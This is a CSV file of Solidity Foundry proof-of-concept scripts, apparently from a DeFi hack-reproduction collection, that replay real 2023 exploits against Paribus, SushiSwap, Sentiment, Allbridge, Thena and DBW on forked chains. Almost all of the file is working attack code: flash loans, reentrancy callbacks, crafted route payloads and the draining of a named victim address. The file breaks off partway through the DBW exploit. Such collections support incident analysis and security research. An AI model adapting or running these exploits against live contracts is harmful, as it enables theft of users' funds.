event,code,summary
#20230411-paribus---reentrancy,"// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;


import ""forge-std/Test.sol"";
import ""./interface.sol"";


// @Analysis
// https://twitter.com/Phalcon_xyz/status/1645742620897955842
// https://twitter.com/BlockSecTeam/status/1645744655357575170
// https://twitter.com/peckshield/status/1645742296904929280
// @TX
// https://arbiscan.io/tx/0x0e29dcf4e9b211a811caf00fc8294024867bffe4ab2819cc1625d2e9d62390af
// @Summary
// a known reentrancy issue from the forked old version of CompoundV2


interface CurvePool {
 function exchange(uint256 i, uint256 j, uint256 dx, uint256 min_dy) external;
}


contract ContractTest is Test {
 IERC20 WBTC = IERC20(0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f);
    IWFTM WETH = IWFTM(payable(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1));
 IERC20 USDT = IERC20(0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9);
    ICErc20Delegate pUSDT = ICErc20Delegate(0xD3e323a672F6568390f29f083259debB44C41f41);
    ICErc20Delegate pWBTC = ICErc20Delegate(0x367351F854506DA9B230CbB5E47332b8E58A1863);
    ICErc20Delegate pETH = ICErc20Delegate(0x375Ae76F0450293e50876D0e5bDC3022CAb23198);
    IAaveFlashloan aaveV3 = IAaveFlashloan(0x794a61358D6845594F94dc1DB02A252b5b4814aD);
    IUnitroller unitroller = IUnitroller(0x2130C88fd0891EA79430Fb490598a5d06bF2A545);
    CurvePool curvePool = CurvePool(0x960ea3e3C7FB317332d990873d354E18d7645590);
    Exploiter exploiter;
 uint256 nonce;


    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);


 function setUp() public {
        cheats.createSelectFork(""arbitrum"", 79_308_097);
        cheats.label(address(WBTC), ""WBTC"");
        cheats.label(address(USDT), ""USDT"");
        cheats.label(address(WETH), ""WETH"");
        cheats.label(address(pUSDT), ""pUSDT"");
        cheats.label(address(pETH), ""pETH"");
        cheats.label(address(pWBTC), ""pWBTC"");
        cheats.label(address(aaveV3), ""aaveV3"");
        cheats.label(address(curvePool), ""curvePool"");
    }


 function testExploit() external {
 payable(address(0)).transfer(address(this).balance);
 address[] memory assets = new address[](2);
        assets[0] = address(WETH);
        assets[1] = address(USDT);
 uint256[] memory amounts = new uint256[](2);
        amounts[0] = 200 * 1e18;
        amounts[1] = 30_000 * 1e6;
 uint256[] memory modes = new uint[](2);
        modes[0] = 0;
        modes[1] = 0;
        aaveV3.flashLoan(address(this), assets, amounts, modes, address(this), """", 0);
 exchangeUSDTWBTC();


 emit log_named_decimal_uint(
 ""Attacker WETH balance after exploit"", WETH.balanceOf(address(this)), WETH.decimals()
            );
    }


 function executeOperation(
 address[] calldata assets,
 uint256[] calldata amounts,
 uint256[] calldata premiums,
 address initiator,
 bytes calldata params
    ) external payable returns (bool) {
        USDT.approve(address(aaveV3), type(uint256).max);
        WETH.approve(address(aaveV3), type(uint256).max);
        USDT.approve(address(pUSDT), type(uint256).max);
        WBTC.approve(address(pWBTC), type(uint256).max);


        exploiter = new Exploiter();
        WETH.transfer(address(exploiter), 100 * 1e18);
        cheats.label(address(exploiter), ""exploiter"");
        exploiter.mint();


        WETH.withdraw(WETH.balanceOf(address(this)));
 payable(address(pETH)).call{value: address(this).balance}("""");
        pUSDT.mint(USDT.balanceOf(address(this)));
 address[] memory cTokens = new address[](2);
        cTokens[0] = address(pETH);
        cTokens[1] = address(pUSDT);
        unitroller.enterMarkets(cTokens);
        pETH.borrow(13_075_471_156_463_824_220);
        pETH.redeem(pETH.balanceOf(address(this))); // Reentrancy enter point


        exploiter.redeem();
 payable(address(WETH)).call{value: address(this).balance}("""");
 return true;
    }


 receive() external payable {
 if (nonce == 2) {
            pUSDT.borrow(USDT.balanceOf(address(pUSDT)));
            pWBTC.borrow(WBTC.balanceOf(address(pWBTC)));
        }
        nonce++;
    }


 function exchangeUSDTWBTC() internal {
        USDT.approve(address(curvePool), type(uint256).max);
        WBTC.approve(address(curvePool), type(uint256).max);
        curvePool.exchange(0, 2, USDT.balanceOf(address(this)), 0);
        curvePool.exchange(1, 2, WBTC.balanceOf(address(this)), 0);
    }
}


contract Exploiter is Test {
 IERC20 WETH = IERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
    ICErc20Delegate pETH = ICErc20Delegate(0x375Ae76F0450293e50876D0e5bDC3022CAb23198);


 function mint() external payable {
        WETH.withdraw(WETH.balanceOf(address(this)));
 payable(address(pETH)).call{value: address(this).balance}("""");
    }


 function redeem() external payable {
        pETH.redeem(pETH.balanceOf(address(this)));
 payable(address(WETH)).call{value: address(this).balance}("""");
        WETH.transfer(msg.sender, WETH.balanceOf(address(this)));
    }


 receive() external payable {}
}",
#20230409-sushiswap---unchecked-user-input,"// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;


import ""forge-std/Test.sol"";
import ""./interface.sol"";


// @Analysis
// https://twitter.com/peckshield/status/1644907207530774530
// https://twitter.com/SlowMist_Team/status/1644936375924584449
// https://twitter.com/AnciliaInc/status/1644925421006520320
// @TX
// https://library.dedaub.com/ethereum/tx/0x04b166e7b4ab5105a8e9c85f08f6346de1c66368687215b0e0b58d6e5002bc32
// @Summary
// Sushi RouteProcessor2 does not check user input `route` carefully.








interface IUniswapV3Pool {
 function swap(
 address recipient,
 bool zeroForOne,
 int256 amountSpecified,
 uint160 sqrtPriceLimitX96,
 bytes calldata data
  ) external returns (int256 amount0, int256 amount1);
}


interface IRouteProcessor2 {
 function processRoute(
 address tokenIn,
 uint256 amountIn,
 address tokenOut,
 uint256 amountOutMin,
 address to,
 bytes memory route
  ) external payable returns (uint256 amountOut);


 function uniswapV3SwapCallback(
 int256 amount0Delta,
 int256 amount1Delta,
 bytes calldata data
  ) external;


 function tridentCLSwapCallback(
 int256 amount0Delta,
 int256 amount1Delta,
 bytes calldata data
  ) external;
}
//original route 0x01514910771af9ca656af840dff83e8264ecf986ca01000001f9a001d5b2c7c5e45693b41fcf931b94e680cac4000000000000000000000000000000000000000000
// my route      0x01514910771af9ca656af840dff83e8264ecf986ca010000017fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000
contract SushiExp is Test, IUniswapV3Pool {
 IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
 IERC20 LINK = IERC20(0x514910771AF9Ca656af840dff83E8264EcF986CA);
 address victim = 0x31d3243CfB54B34Fc9C73e1CB1137124bD6B13E1;
    IRouteProcessor2 processor = IRouteProcessor2(0x044b75f554b886A065b9567891e45c79542d7357);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);


 function setUp() public {
        cheats.createSelectFork(""mainnet"", 17_007_841);


        cheats.label(address(WETH), ""WETH"");
        cheats.label(address(LINK), ""LINK"");
    }


 function testExp() external {
 uint8 commandCode = 1;
 uint8 num = 1;
 uint16 share = 0;
 uint8 poolType = 1;
 address pool = address(this);
 uint8 zeroForOne = 0;
 address recipient = address(0);
 bytes memory route = abi.encodePacked(
          commandCode,
 address(LINK),
          num,
          share,
          poolType,
          pool,
          zeroForOne,
          recipient
        );
        console.log(""WETH balance before attack: %d\n"", WETH.balanceOf(address(this)));


        processor.processRoute(
 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE, //native token
 0,
 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE,
 0,
 0x0000000000000000000000000000000000000000,
          route
        );


        console.log(""WETH balance after  attack: %d\n"", WETH.balanceOf(address(this)));
    }


 


 function swap(
 address recipient,
 bool zeroForOne,
 int256 amountSpecified,
 uint160 sqrtPriceLimitX96,
 bytes calldata data
  ) external returns (int256 amount0, int256 amount1) {
 
    amount0 = 0;
    amount1 = 0;
 bytes memory malicious_data = abi.encode(address(WETH), victim);
      processor.uniswapV3SwapCallback(
 100 * 10 ** 18,
 0,
        malicious_data
      );
  }
}",
#20230405-sentiment---read-only-reentrancy,"// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;


import ""forge-std/Test.sol"";
import ""./interface.sol"";


// @Analysis
// https://twitter.com/peckshield/status/1643417467879059456
// https://twitter.com/spreekaway/status/1643313471180644360
// https://medium.com/coinmonks/theoretical-practical-balancer-and-read-only-reentrancy-part-1-d6a21792066c
// @TX
// https://arbiscan.io/tx/0xa9ff2b587e2741575daf893864710a5cbb44bb64ccdc487a100fa20741e0f74d
// @Summary
// Attacker used view re-entrance Balancer bug to execute malicious code before pool balances were updated and steal money using overpriced collateral


interface IWeightedBalancerLPOracle {
 function getPrice(address token) external view returns (uint256);
}


interface IAccountManager {
 function riskEngine() external;
 function openAccount(address owner) external returns (address);
 function borrow(address account, address token, uint256 amt) external;


 function deposit(address account, address token, uint256 amt) external;


 function exec(address account, address target, uint256 amt, bytes calldata data) external;


 function approve(address account, address token, address spender, uint256 amt) external;
}


interface IBalancerToken is IERC20 {
 function getPoolId() external view returns (bytes32);
}


contract ContractTest is Test {
 IERC20 WBTC = IERC20(0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f);
 IERC20 WETH = IERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
 IERC20 USDC = IERC20(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);
 IERC20 USDT = IERC20(0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9);
 IERC20 FRAX = IERC20(0x17FC002b466eEc40DaE837Fc4bE5c67993ddBd6F);
 address FRAXBP = 0xC9B8a3FDECB9D5b218d02555a8Baf332E5B740d5;
 address account;
 bytes32 PoolId;
 uint256 nonce;
    IBalancerToken balancerToken = IBalancerToken(0x64541216bAFFFEec8ea535BB71Fbc927831d0595);
    IBalancerVault Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IAaveFlashloan aaveV3 = IAaveFlashloan(0x794a61358D6845594F94dc1DB02A252b5b4814aD);
    IAccountManager AccountManager = IAccountManager(0x62c5AA8277E49B3EAd43dC67453ec91DC6826403);
    IWeightedBalancerLPOracle WeightedBalancerLPOracle =
 IWeightedBalancerLPOracle(0x16F3ae9C1727ee38c98417cA08BA785BB7641b5B);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);


 function setUp() public {
        cheats.createSelectFork(""arbitrum"", 77_026_912);
        cheats.label(address(WBTC), ""WBTC"");
        cheats.label(address(USDT), ""USDT"");
        cheats.label(address(USDC), ""USDC"");
        cheats.label(address(WETH), ""WETH"");
        cheats.label(address(FRAX), ""FRAX"");
        cheats.label(address(account), ""account"");
        cheats.label(address(Balancer), ""Balancer"");
        cheats.label(address(aaveV3), ""aaveV3"");
        cheats.label(address(balancerToken), ""balancerToken"");
        cheats.label(address(AccountManager), ""AccountManager"");
        cheats.label(address(WeightedBalancerLPOracle), ""WeightedBalancerLPOracle"");
    }


 function testExploit() external {
 payable(address(0)).transfer(address(this).balance);
        AccountManager.riskEngine();
 address[] memory assets = new address[](3);
        assets[0] = address(WBTC);
        assets[1] = address(WETH);
        assets[2] = address(USDC);
 uint256[] memory amounts = new uint256[](3);
        amounts[0] = 606 * 1e8;
        amounts[1] = 10_050_100 * 1e15;
        amounts[2] = 18_000_000 * 1e6;
 uint256[] memory modes = new uint[](3);
        modes[0] = 0;
        modes[1] = 0;
        modes[2] = 0;
        aaveV3.flashLoan(address(this), assets, amounts, modes, address(this), """", 0);


        console.log(""\r"");
 emit log_named_decimal_uint(
 ""Attacker USDC balance after exploit"", USDC.balanceOf(address(this)), USDC.decimals()
            );
 emit log_named_decimal_uint(
 ""Attacker USDT balance after exploit"", USDT.balanceOf(address(this)), USDT.decimals()
            );
 emit log_named_decimal_uint(
 ""Attacker WETH balance after exploit"", WETH.balanceOf(address(this)), WETH.decimals()
            );
 emit log_named_decimal_uint(
 ""Attacker WBTC balance after exploit"", WBTC.balanceOf(address(this)), WBTC.decimals()
            );
    }


 function executeOperation(
 address[] calldata assets,
 uint256[] calldata amounts,
 uint256[] calldata premiums,
 address initiator,
 bytes calldata params
    ) external payable returns (bool) {
 depositCollateral(assets);
 joinPool(assets);
 exitPool();
        WETH.approve(address(aaveV3), type(uint256).max);
        WBTC.approve(address(aaveV3), type(uint256).max);
        USDC.approve(address(aaveV3), type(uint256).max);
 return true;
    }


 function depositCollateral(address[] calldata assets) internal {
        WETH.withdraw(100 * 1e15);
        account = AccountManager.openAccount(address(this));
        WETH.approve(address(AccountManager), 50 * 1e18);
        AccountManager.deposit(account, address(WETH), 50 * 1e18);
        AccountManager.approve(account, address(WETH), address(Balancer), 50 * 1e18);
        PoolId = balancerToken.getPoolId();
 uint256[] memory amountIn = new uint256[](3);
        amountIn[0] = 0;
        amountIn[1] = 50 * 1e18;
        amountIn[2] = 0;
 bytes memory userDatas = abi.encode(uint256(1), amountIn, uint256(0));
        IBalancerVault.JoinPoolRequest memory joinPoolRequest_1 = IBalancerVault.JoinPoolRequest({
            asset: assets,
            maxAmountsIn: amountIn,
            userData: userDatas,
            fromInternalBalance: false
        });
 // ""joinPool(bytes32,address,address,(address[],uint256[],bytes,bool))""
 bytes memory execData = abi.encodeWithSelector(0xb95cac28, PoolId, account, account, joinPoolRequest_1);
        AccountManager.exec(account, address(Balancer), 0, execData); // deposit 50 WETH
    }


 function joinPool(address[] calldata assets) internal {
        WETH.approve(address(Balancer), 10_000 * 1e18);
        WBTC.approve(address(Balancer), 606 * 1e18);
        USDC.approve(address(Balancer), 18_000_000 * 1e6);
 uint256[] memory amountIn = new uint256[](3);
        amountIn[0] = 606 * 1e8;
        amountIn[1] = 10_000 * 1e18;
        amountIn[2] = 18_000_000 * 1e6;
 bytes memory userDatas = abi.encode(uint256(1), amountIn, uint256(0));
        IBalancerVault.JoinPoolRequest memory joinPoolRequest_2 = IBalancerVault.JoinPoolRequest({
            asset: assets,
            maxAmountsIn: amountIn,
            userData: userDatas,
            fromInternalBalance: false
        });
        Balancer.joinPool{value: 0.1 ether}(PoolId, address(this), address(this), joinPoolRequest_2);
        console.log(
 ""Before Read-Only-Reentrancy Collateral Price \t"", WeightedBalancerLPOracle.getPrice(address(balancerToken))
        );
    }


 function exitPool() internal {
        balancerToken.approve(address(Balancer), 0);
 address[] memory assetsOut = new address[](3);
        assetsOut[0] = address(WBTC);
        assetsOut[1] = address(0);
        assetsOut[2] = address(USDC);
 uint256[] memory amountOut = new uint256[](3);
        amountOut[0] = 606 * 1e8;
        amountOut[1] = 5000 * 1e18;
        amountOut[2] = 9_000_000 * 1e6;
 uint256 balancerTokenAmount = balancerToken.balanceOf(address(this));
 bytes memory userDatas = abi.encode(uint256(1), balancerTokenAmount);
        IBalancerVault.ExitPoolRequest memory exitPoolRequest = IBalancerVault.ExitPoolRequest({
            asset: assetsOut,
            minAmountsOut: amountOut,
            userData: userDatas,
            toInternalBalance: false
        });
        Balancer.exitPool(PoolId, address(this), payable(address(this)), exitPoolRequest);
        console.log(
 ""After Read-Only-Reentrancy Collateral Price \t"", WeightedBalancerLPOracle.getPrice(address(balancerToken))
        );
 address(WETH).call{value: address(this).balance}("""");
    }


 fallback() external payable {
 if (nonce == 2) {
            console.log(
 ""In Read-Only-Reentrancy Collateral Price \t"", WeightedBalancerLPOracle.getPrice(address(balancerToken))
            );
 borrowAll();
        }
        nonce++;
    }


 function borrowAll() internal {
        AccountManager.borrow(account, address(USDC), 461_000 * 1e6);
        AccountManager.borrow(account, address(USDT), 361_000 * 1e6);
        AccountManager.borrow(account, address(WETH), 81 * 1e18);
        AccountManager.borrow(account, address(FRAX), 125_000 * 1e18);
        AccountManager.approve(account, address(FRAX), FRAXBP, type(uint256).max);
 bytes memory execData =
 abi.encodeWithSignature(""exchange(int128,int128,uint256,uint256)"", 0, 1, 120_000 * 1e18, 1);
        AccountManager.exec(account, FRAXBP, 0, execData);
        AccountManager.approve(account, address(USDC), address(aaveV3), type(uint256).max);
        AccountManager.approve(account, address(USDT), address(aaveV3), type(uint256).max);
        AccountManager.approve(account, address(WETH), address(aaveV3), type(uint256).max);
        execData =
 abi.encodeWithSignature(""supply(address,uint256,address,uint16)"", address(USDC), 580_000 * 1e6, account, 0);
        AccountManager.exec(account, address(aaveV3), 0, execData);
        execData =
 abi.encodeWithSignature(""supply(address,uint256,address,uint16)"", address(USDT), 360_000 * 1e6, account, 0);
        AccountManager.exec(account, address(aaveV3), 0, execData);
        execData =
 abi.encodeWithSignature(""supply(address,uint256,address,uint16)"", address(WETH), 80 * 1e18, account, 0);
        AccountManager.exec(account, address(aaveV3), 0, execData);
        execData = abi.encodeWithSignature(
 ""withdraw(address,uint256,address)"", address(USDC), type(uint256).max, address(this)
        );
        AccountManager.exec(account, address(aaveV3), 0, execData);
        execData = abi.encodeWithSignature(
 ""withdraw(address,uint256,address)"", address(USDT), type(uint256).max, address(this)
        );
        AccountManager.exec(account, address(aaveV3), 0, execData);
        execData = abi.encodeWithSignature(
 ""withdraw(address,uint256,address)"", address(WETH), type(uint256).max, address(this)
        );
        AccountManager.exec(account, address(aaveV3), 0, execData);
    }
}",
#20230402-allbridge---flashloan-price-manipulation,"// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;


import ""forge-std/Test.sol"";
import ""./interface.sol"";


// @Analysis
// https://twitter.com/BeosinAlert/status/1642372700726505473
// @Tx
// https://bscscan.com/tx/0x7ff1364c3b3b296b411965339ed956da5d17058f3164425ce800d64f1aef8210


interface IPool{
 function swap(
 address fromToken,
 address toToken,
 uint256 fromAmount,
 uint256 minimumToAmount,
 address to,
 uint256 deadline
    ) external returns (uint256 actualToAmount, uint256 haircut);


 function deposit(uint256 amount) external;
}


interface IPool2{
 function deposit(uint256 amount) external;
 function withdraw(uint256 amountLp) external;
}


interface IBridge{
 function swap(
 uint256 amount, 
 bytes32 token, 
 bytes32 receiveToken, 
 address recipient) 
 external ;
}


contract ContractTest is Test {


 function setUp() external {
        vm.createSelectFork(""bsc"", 26982067);
    }


 function test_exploit() external {
        Exploit exploit = new Exploit();
        exploit.run();
    }
}


contract Exploit{


    IPancakePair pancakeSwap = IPancakePair(0x7EFaEf62fDdCCa950418312c6C91Aef321375A00);
 IERC20 BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
 IERC20 BSC_USD = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IPool pool_0x312B = IPool(0x312Bc7eAAF93f1C60Dc5AfC115FcCDE161055fb0);
    IPool2 pool_0x179a = IPool2(0x179aaD597399B9ae078acFE2B746C09117799ca0);
    IPool2 pool_0xb19c = IPool2(0xB19Cd6AB3890f18B662904fd7a40C003703d2554);
    IBridge bridge = IBridge(0x7E6c2522fEE4E74A0182B9C6159048361BC3260A);


 function run() external {


        console.log(""hacker BUSD bal before attack is       "", BUSD.balanceOf(tx.origin));
 
 // The attacker flashloans $7.5M of BUSD
        pancakeSwap.swap(
 0,
 7_500_000e18,
 address(this),
 ""Gimme da loot"" 
            );
    }


 function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {


 // Swaps $2M BUSD for $2M $BSC-USD in pool_0x312B
        BUSD.approve(address(pool_0x312B), type(uint).max);
        BSC_USD.approve(address(pool_0x312B), type(uint).max);


        pool_0x312B.swap(
 address(BUSD), 
 address(BSC_USD),
 2_003_300e18,
 1,
 address(this),
 block.timestamp + 100 seconds 
            );
 
 // Then deposits $5M BUSD into pool 0x179a
        BUSD.approve(address(pool_0x179a), type(uint).max);
        pool_0x179a.deposit(5_000_000e18);


 // Swap BUSD to BSC_USD
        pool_0x312B.swap(
 address(BUSD),
 address(BSC_USD),
 496_700e18,
 1,
 address(this),
 block.timestamp + 100 seconds
            );
 
 // Deposit $2 mil into pool_0xb19c
        BSC_USD.approve(address(pool_0xb19c), type(uint).max);
        pool_0xb19c.deposit(2_000_000e18);


 /*
         The attacker then swaps $500K BSC-USD for $BUSD 
        in Allbridge's Bridge contract, resulting in a high 
        dividend for the previous liquidity deposit.
        */ 


 bytes32 bsc_usd = 0x00000000000000000000000055d398326f99059ff775485246999027b3197955;
 bytes32 busd = 0x000000000000000000000000e9e7cea3dedca5984780bafc599bd69add087d56; 


 uint BSC_USD_bal = BSC_USD.balanceOf(address(this));
        bridge.swap(
            BSC_USD_bal,
            bsc_usd,
            busd,
 address(this)
        );


 /*
         The BUSD liquidity in 0x179a is then removed, 
        at which point the liquidity balance within 
        the 0x179a pool is broken.
        */


        pool_0x179a.withdraw(4830262616);


 /*
         The attacker was then able to swap out $790,000 
        of BSC-USD from Bridge using only $40,000 of BUSD.
        */
 
        bridge.swap(
 40_000e18,
            busd,
            bsc_usd,
 address(this)
        );


 // Withdraw from pool_0xb19c
        pool_0xb19c.withdraw(1993728530);


 // Swap BSC_USD to BUSD in pool_0x312B
        BSC_USD_bal = BSC_USD.balanceOf(address(this));
        pool_0x312B.swap(
 address(BSC_USD),
 address(BUSD),
            BSC_USD_bal,
 1,
 address(this),
 block.timestamp + 100 seconds
            );


 // Repay flashloan
        BUSD.transfer(
 address(pancakeSwap), 
 7_522_500e18
            );


 // Transfer loot to attacker
        BUSD.transfer(
 tx.origin,
            BUSD.balanceOf(address(this))
            );


        console.log(""hacker BUSD bal after attack is        "", BUSD.balanceOf(tx.origin));  
    }


}",
#20230328---thena---yield-protocol-flaw,"

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;


import ""forge-std/Test.sol"";
import ""./interface.sol"";


// @Analysis
// https://twitter.com/LTV888/status/1640563457094451214?t=OBHfonYm9yYKvMros6Uw_g&s=19
// @Tx
// https://bscscan.com/tx/0xdf6252854362c3e96fd086d9c3a5397c303d265649aee0b023176bb49cf00d4b


interface IThenaRewardPool {
 function unstake(address,uint256,address,bool) external;
}


interface IVolatileV1 {
 function metadata() external view returns (uint dec0, uint dec1, uint r0, uint r1, bool st, address t0, address t1);
 function claimFees() external returns (uint, uint);
 function tokens() external view returns (address, address);
 function transferFrom(address src, address dst, uint amount) external returns (bool);
 function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
 function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
 function burn(address to) external returns (uint amount0, uint amount1);
 function mint(address to) external returns (uint liquidity);
 function getReserves() external view returns (uint _reserve0, uint _reserve1, uint _blockTimestampLast);
 function getAmountOut(uint, address) external view returns (uint);


 function name() external view returns(string memory);
 function symbol() external view returns(string memory);
 function totalSupply() external view returns (uint);
 function decimals() external view returns (uint8);


 function claimable0(address _user) external view returns (uint);
 function claimable1(address _user) external view returns (uint);


 function isStable() external view returns(bool);
}


contract ContractTest is Test {


 IERC20 THENA = IERC20(0xF4C8E32EaDEC4BFe97E0F595AdD0f4450a863a11);
 IERC20 BUSD  = IERC20(0x55d398326f99059fF775485246999027B3197955);
 IERC20 USDC = IERC20(0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d);
 IERC20 wUSDR = IERC20(0x2952beb1326acCbB5243725bd4Da2fC937BCa087);
    IThenaRewardPool pool = IThenaRewardPool(0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    Uni_Router_V2 Router = Uni_Router_V2(0x20a304a7d126758dfe6B243D0fc515F83bCA8431);
    Uni_Pair_V2 USDC_BUSD = Uni_Pair_V2(0x618f9Eb0E1a698409621f4F487B563529f003643);
    IVolatileV1 wUSDR_USDC = IVolatileV1(0xA99c4051069B774102d6D215c6A9ba69BD616E6a);


    MockThenaRewardPool mock;


 function setUp() public {
        cheats.createSelectFork(""bsc"", 26_834_149);
        cheats.label(address(THENA), ""THENA"");
        cheats.label(address(USDC), ""USDC"");
        cheats.label(address(BUSD), ""BUSD"");
        cheats.label(address(pool), ""ThenaRewardPool"");
        cheats.label(address(Router), ""UniV2Router"");
        cheats.label(address(USDC_BUSD), ""USDC_BUSD"");
        cheats.label(address(wUSDR), ""wUSDR"");
        cheats.label(address(wUSDR_USDC), ""wUSDR_USDC"");
    }


 function testExploit() external {
        mock = new MockThenaRewardPool();
 emit log_named_decimal_uint(
 ""Attacker BUSD balance after exploit"", BUSD.balanceOf(address(this)), BUSD.decimals()
        );
    }
}


contract MockThenaRewardPool {
    IThenaRewardPool pool = IThenaRewardPool(0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F);
 IERC20 BUSD  = IERC20(0x55d398326f99059fF775485246999027B3197955);


 constructor() {
 unstake(address(BUSD), 0, address(this), true);
    }


 function unstake(address _token,uint256 _amount,address _pool,bool _sign) internal {
        pool.unstake(_token, _amount, _pool, _sign);
        BUSD.transfer(msg.sender, BUSD.balanceOf(address(this)));
    }
}",
#20230325---dbw--business-logic-flaw,"// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;


import ""forge-std/Test.sol"";
import ""./interface.sol"";


// @Analysis
// https://twitter.com/BeosinAlert/status/1639655134232969216
// https://twitter.com/AnciliaInc/status/1639289686937210880
// @TX
// https://bscscan.com/tx/0x3b472f87431a52082bae7d8524b4e0af3cf930a105646259e1249f2218525607
// @Summary
// The root cause is that the dividend awards are based on the percentage of LP currently owned by the user,
// and does not take into account multiple dividends after the transfer of LP.
// @Similar events
// https://github.com/SunWeb3Sec/DeFiHackLabs/tree/main#20230103---gds---business-logic-flaw
// https://github.com/SunWeb3Sec/DeFiHackLabs/tree/main#20221001-rl-token---incorrect-reward-calculation


interface IDBW is IERC20 {
 function pledge_lp(uint256 count) external;
 function getStaticIncome() external;
 function redemption_lp(uint256 count) external;
}


contract ContractTest is Test {
 IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IDBW DBW = IDBW(0xBF5BAea5113e9EB7009a6680747F2c7569dfC2D6);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0x69D415FBdcD962D96257056f7fE382e432A3b540);
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
 address dodo1 = 0xFeAFe253802b77456B4627F8c2306a9CeBb5d681;
 address dodo2 = 0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A;
 address dodo3 = 0x26d0c625e5F5D6de034495fbDe1F6e9377185618;
 address dodo4 = 0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476;
    Uni_Pair_V2 flashSwapPair = Uni_Pair_V2(0x618f9Eb0E1a698409621f4F487B563529f003643);
 uint256 dodo1FlashLoanAmount;
 uint256 dodo2FlashLoanAmount;
 uint256 dodo3FlashLoanAmount;
 uint256 dodo4FlashLoanAmount;
 uint256 PairFlashLoanAmount;
    claimRewardImpl RewardImpl;


    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);


 function setUp() public {
        cheats.createSelectFork(""bsc"", 26_745_691);
        cheats.label(address(USDT), ""USDT"");
        cheats.label(address(DBW), ""DBW"");
        cheats.label(address(Pair), ""Pair"");
        cheats.label(address(Router), ""Router"");
        cheats.label(address(dodo1), ""dodo1"");
        cheats.label(address(dodo2), ""dodo2"");
        cheats.label(address(dodo3), ""dodo3"");
        cheats.label(address(dodo4), ""dodo4"");
        cheats.label(address(flashSwapPair), ""flashSwapPair"");
    }


 function testExploit() external {
        RewardImpl = new claimRewardImpl();
        dodo1FlashLoanAmount = USDT.balanceOf(dodo1);
 DVM(dodo1).flashLoan(0, dodo1FlashLoanAmount, address(this), new bytes(1));


 emit log_named_decimal_uint(
 ""Attacker USDT balance after exploit"", USDT.balanceOf(address(this)), USDT.decimals()
            );
    }


 function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
 if (msg.sender == dodo1) {
            dodo2FlashLoanAmount = USDT.balanceOf(dodo2);
 DVM(dodo2).flashLoan(0, dodo2FlashLoanAmount, address(this), new bytes(1));
            USDT.transfer(dodo1, dodo1FlashLoanAmount);
        } else if (msg.sender == dodo2) {
            dodo3FlashLoanAmount = USDT.balanceOf(dodo3);
 DVM(dodo3).flashLoan(0, dodo3FlashLoanAmount, address(this), new bytes(1));
            USDT.transfer(dodo2, dodo2FlashLoanAmount);
        } else if (msg.sender == dodo3) {
            dodo4FlashLoanAmount = USDT.balanceOf(dodo4);
 DVM(dodo4).flashLoan(0, dodo4FlashLoanAmount, address(this), new bytes(1));
            USDT.transfer(dodo3, dodo3FlashLoanAmount);
        } else if (msg.sender == dodo4) {
            PairFlashLoanAmount = 3_037_214_233_168_643_025_678_873;
            flashSwapPair.swap(PairFlashLoanAmount, 0, address(this), new bytes(1));
            USDT.transfer(dodo4, dodo4FlashLoanAmount);
        }
    }


 function hook(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        USDT.approve(address(Router), type(uint256).max);
        DBW.approve(address(Router), type(uint256).max);
        Pair.approve(address(Router), type(uint256).max);
 USDTToDBW_AddLiquidity();
 miniProxyCloneFactory(address(RewardImpl));
 RemoveLiquidity_DBWToUSDT();
        USDT.transfer(address(flashSwapPair), PairFlashLoanAmount * 10_000 / 9999 + 1000);
    }


 function USDTToDBW_AddLiquidity() internal {
 address[] memory path = new address[](2);
        path[0] = address(USDT);
        path[1] = address(DBW);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
 800_000 * 1e18, 0, path, address(this), block.timestamp
        );
        Router.addLiquidity(
 address(USDT),
 address(DBW),
            USDT.balanceOf(address(this)),
            DBW.balanceOf(address(this)),
 0,
 0,
 address(this),
 block.timestamp
        );
    }


 function miniProxyCloneFactory(address impl) internal {
 for (uint256 i; i < 18; ++i) {
 uint256 _salt = uint256(keccak256(abi.encodePacked(i)));
